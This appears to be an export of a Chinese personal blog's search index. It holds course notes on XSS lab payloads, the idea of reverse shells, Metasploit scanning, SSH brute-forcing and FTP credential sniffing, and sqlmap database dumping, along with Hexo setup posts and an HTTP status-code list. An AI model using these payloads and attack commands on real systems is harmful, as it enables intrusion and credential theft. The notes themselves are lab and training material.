XSS-Example 8 在表单中的&lt;都被转义，查看源代码可看到效果 在url中闭合from标签，可实现xss 1/&quot;&gt;&lt;\script&gt;alert(1)&lt;\/script&gt; XSS-Example 9 hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分） 12location.hashlocation.hash.substring(1) //从#后第一个字符开始读取 因此payload：1example9.php#&lt;\script&gt;alert(1)&lt;\/script&gt; 注意 : 博主用的ie浏览器可以实验成功 火狐和谷歌浏览器都会对&lt;转码如下： 1%3Cscript%3Ealert(1)%3C/script%3E]]></content>
      <categories>
        <category>网络安全课程笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hexo-2 Hexo主题设置]]></title>
    <url>%2F2019%2F04%2F27%2FHexo-2%2F</url>
    <content type="text"><![CDATA[自己搭建博客的主题设置过程，供大家参考 修改hexo部署端口hexo server -p 80 站点_config.yml的修改 基本信息 语言lanuage: zh-Hans next主题 主题_config.yml的修改next主题样式： scheme: Gemini menu菜单 home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive 头像设置 avata: /images/cat.gif next动态背景 搜索canvas_nest: true 侧边栏社交小图片设置12345#social: 注释去掉socia_icons: enable: true Github: github 文章添加更新时间123updated_at: false 修改为updated_at: true 文章字数、阅读时长统计 安装插件 1npm i --save hexo-wordcount 修改_config.yml 123456post_wordcount: item_text: true wordcount: true # 单篇 字数统计 min2read: true # 单篇 阅读时长 totalcount: false # 网站 字数统计 separated_meta: true 页脚美化 隐藏网页底部powered By Hexo / 强力驱动 1copyright: false 阅读全文1&lt;\!--more--&gt; //没有斜杠 添加分类 新建一个分类页面 1hexo new page categories source文件夹下有了categorcies/index.mdindex.md内容如下： 123title: 分类date: 2019-04-27 16:35:57type: &quot;categories&quot; 把文章归入分类只需在文章的顶部标题下方添加categories字段，即可自动创建分类名并加入对应的分类中 举个栗子：title: 分类测试文章标题categories: 分类名 添加标签 新建一个标签页面 1hexo new page tags source文件夹下有了tags/index.md打开index.md文件将title设置为title: 标签index.md内容如下： 123title: 标签date: 2019-04-27 16:42:09type: &quot;tags&quot; 把文章添加标签只需在文章的顶部标题下方添加tags字段，即可自动创建标签名并归入对应的标签中 举个栗子：title: 标签测试文章标题tags: -（空格）标签1 -（空格）标签2 添加关于标签 新建一个关于页面 1hexo new page about source文件夹下有了about/index.mdindex.md文件即可编辑关于你的信息添加搜索功能 安装 hexo-generator-searchdb 插件 1npm install hexo-generator-searchdb --save 打开 站点配置文件 找到Extensions在下面添加 123456#搜索search: path: search.xml field: post format: html limit: 10000 打开 主题配置文件 找到Local search，将enable设置为true hexo文章加图片 首先把修改站点_config.yml 1psot_asset_folder:true 在blog（hexo）目录下执行 1npm install hexo-asset-image --save 运行hexo new “博客名”来生成md博客时，会在_post目录下看到一个与博客同名的文件夹。 将想要上传的图片先扔到文件夹下，然后在博客中使用markdown的格式引入图片： 1![你想要输入的替代文字](xxxx/图片名.jpg) //路径使用相对路径 添加评论功能方法一: 来必力1livere_uid: MTAyMC80MzgyNy8yMDM2Mg== 方法二：Leancloud 参考文章链接https://blog.csdn.net/weixin_39345384/article/details/80787998 添加宠物 在博客目录下安装依赖 1npm install --save hexo-helper-live2d 在站点_config.yml配置如下信息 1234567891011121314151617#宠物live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-hijiki display: position: right width: 150 height: 300 mobile: show: true 安装模型包 1npm install 模型的包名 参考链接：https://blog.csdn.net/qq_43020645/article/details/82794092 取消宠物 1npm uninstall hexo-helper-live2d]]></content>
      <categories>
        <category>Hexo 搭建心得</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hexo-1 Hexo环境搭建+github部署备份]]></title>
    <url>%2F2019%2F04%2F27%2FHexo-1%2F</url>
    <content type="text"><![CDATA[Hexo环境准备npm、hexo安装 阿里云轻量级服务器 or 虚拟机搭建的linux xshell远程链接阿里云服务器 服务器安装rz，szyum install lrzsz 安装node.js设置全局 123cd node/binln -s /root/install/node/bin/node /usr/local/bin/nodeln -s /root/install/node/bin/npm /usr/local/bin/npm 安装hexo并设置全局 12npm install hexo-cli -gln -s /root/install/node/lib/node_modules/hexo/bin/hexo /usr/local/bin/hexo github配置 github用户注册为renblog 创建renblog.github.io库 创建hexo分支，设置成为默认分支 安装git 1yum install git-core 克隆库 1git clone https://github.com/renblog/renblog.github.io.git 进入克隆的库执行 1npm install hexo - 注意 克隆的库中有.git文件夹，在hexo init执行前，一定先备份.git文件夹，在hexo init之后，再把备份的.git文件夹覆盖到renblog.github.io中 创建一个空的文件 然后执行如下命令 1hexo init 生成的文件移到renblog.github.io目录下并覆盖 renblog.github.io目录继续下执行 12npm installnpm install hexo-deployer-git（此时检查分支实在hexo下） blog备份到github上 修改_config.yml如下： 1234deploy: type: git repo: https://github.com/renblog/renblog.github.io branch: master 还是在renblog.github.io目录下执行 123git add .git commit -m &quot;命名&quot;git push origin hexo //推到github上， 部署博客到github 设置git的用户名和email（操作一次即可） 12git config --global user.name &quot;你的Github用户名&quot;git config --global user.email &quot;你注册Github使用的邮箱&quot; 部署到github上 1234hexo clean //如果界面有延迟执行此命令hexo g //生成加载页面npm install --save hexo-deployer-git //部署githexo d //部署hexo 访问git上的博客 链接为：renblog.github.io 关于日常的一些改动依此执行如下命令 1234git add .git commit -m &quot;注释&quot;git push origin hexo(此时默认分支依然是hexo) 然后执行 1hexo g -d //发布网站到master上 测试blog是否备份成功一 在我的阿里云服务器上测试 进入/var/www/html目录下 1git clone https://github.com/renblog/renblog.github.io.git //拷贝仓库 会生成renblog.github.io文件夹 进入此文件夹执行如下命令 123npm install hexonpm install npm install hexo-deployer-git 注意不需要加hexo init命令 创建一篇文章1hexo new Hexo-1 执行如下备份命令 12345git add.git commit -m &quot;注释&quot;git push origin hexogit cleangit g -d //推到github上 先备份后发布 测试blog是否备份成功二 将刚刚创建的新仓库 clone 至本地，将之前的 hexo 文件夹中的 _config.yml、themes/、source/、scaffolds/、package.json 和 .gitignore 复制至 WincerChan.github.io 文件夹； 将 themes/next/（我用的是 NexT 主题）中的 .git/ 删除，否则无法将主题文件夹 push（也可以将主题文件夹使用子模块的方式添加到该仓库)； 在 WincerChan.github.io 文件夹执行 npm install 和 npm install hexo-deployer-git（这里可以看一看分支是不是显示为 hexo）； 执行 git add、git commit -m “”、git push origin hexo 来提交 hexo 网站源文件； 执行 hexo g -d 生成静态网页部署至 Github 上。 git常用命令12git branch //查看当前分支 git checkout hexo //切换分支 Hexo _config.yml配置]]></content>
      <categories>
        <category>Hexo 搭建心得</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Http常见状态码含义]]></title>
    <url>%2F2019%2F04%2F20%2FHttp-status%2F</url>
    <content type="text"><![CDATA[1开头的http状态码表示临时响应并需要请求者继续执行操作的状态代码。 100 （继续） 请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。 2开头的http状态码表示请求成功 200 成功处理了请求，一般情况下都是返回此状态码；201 请求成功并且服务器创建了新的资源。202 接受请求但没创建资源；203 返回另一资源的请求；204 服务器成功处理了请求，但没有返回任何内容；205 服务器成功处理了请求，但没有返回任何内容；206 处理部分请求； 3xx （重定向）重定向代码，也是常见的代码 300 （多种选择） 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。304 （未修改） 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。305 （使用代理） 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 4开头的http状态码表示请求出错 400 服务器不理解请求的语法。401 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。403 服务器拒绝请求。404 服务器找不到请求的网页。405 禁用请求中指定的方法。406 无法使用请求的内容特性响应请求的网页。407 此状态代码与 401类似，但指定请求者应当授权使用代理。408 服务器等候请求时发生超时。409 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。410 如果请求的资源已永久删除，服务器就会返回此响应。411 服务器不接受不含有效内容长度标头字段的请求。412 服务器未满足请求者在请求中设置的其中一个前提条件。413 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。414 请求的 URI（通常为网址）过长，服务器无法处理。415 请求的格式不受请求页面的支持。416 如果页面无法提供请求的范围，则服务器会返回此状态代码。417 服务器未满足”期望”请求标头字段的要求。 5开头状态码并不常见，但是我们应该知道 500 （服务器内部错误） 服务器遇到错误，无法完成请求。501 （尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本]]></content>
      <tags>
        <tag>Http协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于反弹Shell的理解]]></title>
    <url>%2F2019%2F04%2F20%2FRebound-shell%2F</url>
    <content type="text"><![CDATA[想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。 那么什么情况下正向连接不太好用了呢？1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。]]></content>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-6-2 web应用渗透之漏洞扫描神器W3AF]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-6-2%2F</url>
    <content type="text"><![CDATA[一、扫描神器W3AF（Web Application Attack and Audit Framework）1.W3AF简介W3AF是阿根廷人Andres Riancho创建的一个开源项目，目标是成为一个Web应用攻击和统计的平台。目前W3AF分为主要两个部分——核心模块和插件部分。核心模块负责进程的调度和插件的使用，插件部分则负责查找并攻击Web安全漏洞。插件部分根据功能的不同，又分为8类模块，包括：发现模块、审计模块、搜索模块、攻击模块、输出模块、修改模块、入侵模块、破解模块，他们之间的运行关系如图：2.各模块的功能（1）发现模块负责查找HTTP信息，并探测服务器、数据库、web应用防火墙等信息例如halberd、hmap、afd、fingetprint等信息。在发现模块中，最重要的插件是webSpider，它基于爬虫技术爬取网站的每个链接和表单，这是进行漏洞探测不可或缺的信息。（2）暴力破解破解哪些需要认证的页面，在发现过过程中，经常会遇到认证登陆页面，暴力破解模块支持对基本认证机制的破解（需要配置字典），以及表单登陆机制的暴力破解。（3）审计模块探测漏洞的模块，W3AF支持目前主流的web应用漏洞类型的探测，例如SQLi、XSS等，探测漏洞的方法也是多种多样的，例如模式匹配、基于显示错误的方法、基于时间延迟的方法、远程创建、响应差别（如采用不同的参数输入AND 1=1、AND 1=2）等，当确定存在安全漏洞的同时，存在漏洞的URL会被保存，等待攻击模块对它实施攻击。（4）搜索Grep捕获HTTP请求与应答过程中的一些关注信息（例如IP、Email地址、信用卡信息等），它仅能用来分析数据，统统是修改模块允许使用者基于正则表达式修改相关的请求和应答消息。（5）攻击模块用来读取前面扫描获取的扫描信息，然后试图通过该类模块中的各种插件来攻击安全漏洞，例如：sql_webshell、advshell、sqlmap、xssbeef、remote file include shell、os command shell等。3.W3AF使用]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-6-1 Web应用渗透之基础知识与Wmap扫描操作]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-6-1%2F</url>
    <content type="text"><![CDATA[一、web应用渗透技术基础知识二、web应用攻击发展趋势三、owasp Web漏洞 TOP 101.SQL注入攻击2.跨站脚本3.跨站伪造请求4.会话认证管理缺陷5.安全误配置6.不安全密码存储7.不安全的对象参考8.限制URL访问失败9.缺乏传输层保护10.未验证的重定向和跳转四、web应用攻击典型案例 五、基于metasploit框架的web应用渗透技术1.辅助模块metasploit的辅助模块基本都在modules/auxiliary/下。web应用辅助扫描、漏洞查找等模块。（1）wmap web扫描器0x01 wmap简介Wmap本身不是一个独立的漏洞扫描器，而是作为Metasploit的一个模块，结合Web漏洞和Web服务相关的模块协同工作，完成目标服务器的扫描任务，也就是说，如果我们想要使用Wmap模块就需要将它在Metasploit中载入才可以使用。0x02 metasploit数据库准备在运行 Metasploit 终端前，我们需要先启动用于存储扫描结果的数据库服务： service postgresql start 如果是初次使用，需要初始化并启动数据库： msfdb init msfdb start 0x03 Wmap使用首先打开一个终端，启动Metasploit: msfconsole 然后等待msf打开之后，我们在msf中载入wmap的插件: load wmap 0x04 wmap渗透测试实验环境：攻击主机：kali linux 2019.1靶机：www.dvssc.com(10.10.10.129) msf5 &gt; load wmap .-.-.-..-.-.-..---..---. | | | || | | || | || |-&apos; `-----&apos;`-&apos;-&apos;-&apos;`-^-&apos;`-&apos; [WMAP 1.5.1] === et [ ] metasploit.com 2012 [*] Successfully loaded plugin: wmap msf5 &gt; help wmap Commands ============= Command Description ------- ----------- wmap_modules Manage wmap modules wmap_nodes Manage nodes wmap_run Test targets wmap_sites Manage sites wmap_targets Manage targets wmap_vulns Display web vulns msf5 &gt; wmap_sites -a http://10.10.10.129 (1) [*] Site created. msf5 &gt; wmap_sites -l (2) [*] Available sites =============== Id Host Vhost Port Proto # Pages # Forms -- ---- ----- ---- ----- ------- ------- 0 10.10.10.129 10.10.10.129 80 http 0 0 通过命令添加要扫描的网站（1）查看扫描的targest（2） msf5 &gt; wmap_targets -t http://10.10.10.129 （3） msf5 &gt; wmap_run -t （4） [*] Testing target: [*] Site: 10.10.10.129 (10.10.10.129) [*] Port: 80 SSL: false ============================================================ [*] Testing started. 2019-03-26 03:59:14 -0400 [*] Loading wmap modules... [*] 39 wmap enabled modules loaded. [*] =[ SSL testing ]= ============================================================ [*] Target is not SSL. SSL modules disabled. [*] =[ Web Server testing ]= ............................................skip 添加网站作为扫描目标（3），同时查看哪些模块将会在扫描中使用（4） msf5 &gt; wmap_run -e （5） [+] 10.10.10.129:80 Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1 （6） [+] Contents of Robots.txt: （7） User-agent: * Disallow: /administrator/ Disallow: /cache/ msf5 &gt; vulns (8) Vulnerabilities =============== Timestamp Host Name References --------- ---- ---- ---------- 2019-03-26 08:01:35 UTC 10.10.10.129 HTTP Trace Method Allowed CVE-2005-3398,CVE-2005-3498,OSVDB-877,BID-11604,BID-9506,BID-9561 查看wmap扫描结果并进行攻击（5）看到目标服务器的旗标等信息（6），同时找到服务器敏感信息（7），最后通过vulns显示扫描出来的漏洞信息（8）]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-5 问题答疑]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-5%2F</url>
    <content type="text"><![CDATA[1.网站防火security2.firefox浏览器弹窗设置…………….]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-4 Web应用漏扫注入工具与Msf数据共享功能]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-4%2F</url>
    <content type="text"><![CDATA[1.漏洞扫描（1）openvas类似于nessus漏洞扫描器功能：识别远程主机、web应用存在的各种漏洞。2.web应用漏洞扫描、渗透测试软件的接口（1）W3AF 功能：综合性web应用扫描和审计工具 （2）SQLMap 功能：SQL注入和攻击工具 （3）wXf（找不到了） 功能：开源web渗透测试框架 （4）XSSF 功能：跨站脚本攻击框架 （5）BeEF** 功能；浏览器攻击平台框架3.开源web应用漏洞扫描工具（1）2.渗透测试信息数据库与共享功能和具体使用步骤参考metasploit魔鬼训练p134]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-2 Nmap扫描原理及口令猜测与嗅探]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-2%2F</url>
    <content type="text"><![CDATA[一、.主机探测与端口扫描活跃主机扫描，指已连接到网络上、处于运行状态且网络功能正常的主机。1.ICMP ping -c 次数 目的ip地址2.metasploit的主机发现模块（1）arp_sweep //地址解析协议定义，ip地址转化为MAC地址，进行广播udp_sweepARP扫描器use auxiliary/scanner/discovery/arp_sweep ; show options ; set RHOSTS 10.10.10.0/24 ; set THTEADS 50 ; set INTERFACE 网卡名称 ; run(2)Nmap进行主机探测nmap -sP ip地址 //同通过发送ICMP echo请求探测主机是否存活原理通ping-sT TCP connect 扫描，类似Metasploit中的tcp扫描模块-sS TCP SYN扫描 类似Metasploit中的syn扫描模块-sF/-sX/-sN 这些扫描通过发送一些特殊标志位以避开设备或软件的检测-sU 探测目标主机开放了哪些UDP端口-Pn 在扫描之前，不发送ICMP echo 请求测试目标是否活跃-O 启用对于TCP/IP协议栈的指纹特征获取远程主机的操作系统类型等信息更加详细见nmap探测原理.pdf 二、口令猜测与嗅探1.攻击SSH服务需要好的用户名和口令字典（1）use auxiliary/scanner/ssh/ssh_login ; set RHOSTS 10.10.10.2544 ; set USERNAME root ;set PASS_FILE /root/words.txt ; set THREADS 50 ; run（2）session -l查看获得权限的主机名称 ； seeion -i 编号 取得shell2.psnuffle口令嗅探获取FTP明文登陆口令use auxiliary/sniffer/psnuffle ; run]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-3 网络漏洞扫描之Openvas环境搭建与使用]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-3%2F</url>
    <content type="text"><![CDATA[一、漏洞扫描前期知识点梳理1.通过网络对目标进行搜集主要技术有主机探测与端口扫描、服务扫描与查点与网络漏洞扫描等，最强大的开源网络扫描软件为Nmap和OpenVAS，都可以集成到metasploit框架中。 2.metasploit提供了丰富网络扫描、服务扫描、查点功能 3.metasploit提供了对postgresql数据库的支持，能够存储渗透测试过程中搜集目标网络情报信息，为渗透测试的威胁建模、漏洞分析、渗透攻击与报告撰写等阶段提供数据支持，并支持数据库共享与MSF RPC服务两种方式在渗透测试团队之间共享信息。4.黑盒扫描、白盒扫描 二、openVAS漏洞扫描器介绍与环境搭建1.功能类似于nuessus的综合型漏洞扫描器，可以用来识别主机、web应用存在的各种漏洞。opoenvas环境搭建过程2.主要功能模块 3.openvas安装（1）apt install openvas（2）重置密码openvasmd –user=admin –new-password=hahaha（3）openva-start开启openvas（4）openvas-check-setup检查openvas配置是否正确4.openvas简单漏扫步骤 0x01 建立一个扫描目标0x02 建立一个新的扫描任务 建立完扫描目标之后，需要建立扫描任务关联扫描目标。 建立扫描任务有两种方式： ① 可以使用任务向导进行任务的创建，任务向导可以快速的建立并开启一个扫描任务；高级任务向导有更详细的选项，如登录凭证之类的信息；修改任务向导可以快速的选择之前创建的任务重新创建任务开启扫描。任务向导中没有填写的选项都按照设置（Extras→My Settings）的默认配置进行扫描任务配置。② 可以通过星型图标新建任务创建扫描任务，内容较详细。0x03 扫描测试扫描机：kali-2019.1靶机：metasploit魔鬼训练营dvssc网络环境扫描结果：]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-1 公开信息收集]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-1%2F</url>
    <content type="text"><![CDATA[一、web应用渗透技术基础知识二、web应用攻击发展趋势三、owasp Web漏洞 TOP 101.SQL注入攻击2.跨站脚本3.跨站伪造请求4.会话认证管理缺陷5.安全误配置6.不安全密码存储7.不安全的对象参考8.限制URL访问失败9.缺乏传输层保护10.未验证的重定向和跳转四、web应用攻击典型案例 五、基于metasploit框架的web应用渗透技术 1.辅助模块metasploit的辅助模块基本都在modules/auxiliary/下。web应用辅助扫描、漏洞查找等模块。（1）wmap web扫描器0x01 wmap简介Wmap本身不是一个独立的漏洞扫描器，而是作为Metasploit的一个模块，结合Web漏洞和Web服务相关的模块协同工作，完成目标服务器的扫描任务，也就是说，如果我们想要使用Wmap模块就需要将它在Metasploit中载入才可以使用。0x02 metasploit数据库准备在运行 Metasploit 终端前，我们需要先启动用于存储扫描结果的数据库服务： service postgresql start 如果是初次使用，需要初始化并启动数据库： msfdb init msfdb start 0x03 Wmap使用首先打开一个终端，启动Metasploit: msfconsole 然后等待msf打开之后，我们在msf中载入wmap的插件: load wmap 0x04 wmap渗透测试实验环境：攻击主机：kali linux 2019.1靶机：www.dvssc.com(10.10.10.129) msf5 &gt; load wmap]]></content>
      <categories>
        <category>Metasploit魔鬼训练营笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap-1 基础使用操作]]></title>
    <url>%2F2019%2F04%2F19%2Fsqlmap-1%2F</url>
    <content type="text"><![CDATA[sqlmap使用教程 1.检测注入点是否可用sqlmap.py -u “url”-u 输入指定注入点url 2.若需要用户输入[y/n]，系默认需添加一个参数sqlmap.py -u “url” –batch注入结果显示(1)注入参数id为GET注入，注入类型有四种分别为boolean-based、error-based、time-based blind、union query(2)web服务器系统为linux-centOS 7-1708(3)web应用技术为 apache 2.4.6 php 5.4.16(4)数据库类型为mysql 5 3.爆库一条命令即可爆出该sqlserver所有数据库名称sqlmap.py -u “url” –dbs 4.web使用当前的数据库sqlmap.py -u “url” –current-db 5.web数据库使用账户sqlmap.py -u “url” –current-user 6.列出mysql所有用户sqlmap.py -u “url” –users 7.数据库账户与密码sqlmap.py -u “url” –password 8.列出数据库中的表sqlmap.py -u “url” -D 数据库名称 –tables参数：-D：指定数据库名称–tables：列出表 9.列出表中的字段sqlmap.py -u “url” -D 数据库名称 -T 表名称 –columns参数：-D：指定数据库名称-T：指定要列出字段的表–columns：指定列出字段 10.爆字段内容sqlmap.py -u “url” -D 数据库名称 -T 表名称 -C 字段名参数：-C：指定要爆的字段–dump：将结果盗出 11.如果字段内容太多，需要花费很多时间。可以指定导出特定范围的字段内容，命令如下：sqlmap.py -u “url” -D 数据库名称 -T 表名称 -C 字段名 –start 1 –stop 10 –dump参数：–start：指定开始的行–stop：指定结束的行]]></content>
      <categories>
        <category>Sqlmap的使用</category>
      </categories>
  </entry>
</search>
